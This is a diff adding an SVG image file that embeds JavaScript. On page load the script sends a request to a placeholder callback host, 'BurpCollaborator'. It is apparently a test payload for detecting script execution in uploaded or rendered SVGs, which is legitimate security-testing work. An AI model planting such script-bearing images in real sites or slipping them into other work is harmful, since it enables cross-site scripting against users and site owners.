@@ -1,0 +1,21 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+  <script type="text/javascript">
+
+    function makeRequest() {
+      var xhr = new XMLHttpRequest();
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+          if (xhr.status == 200) {
+            console.log(xhr.responseText);
+          } else {
+            console.error('Error:', xhr.status);
+          }
+        }
+      };
+      xhr.open('GET', 'http://BurpCollaborator', true);
+      xhr.send();
+    }
+
+    window.addEventListener('load', makeRequest);
+  </script>
+</svg>
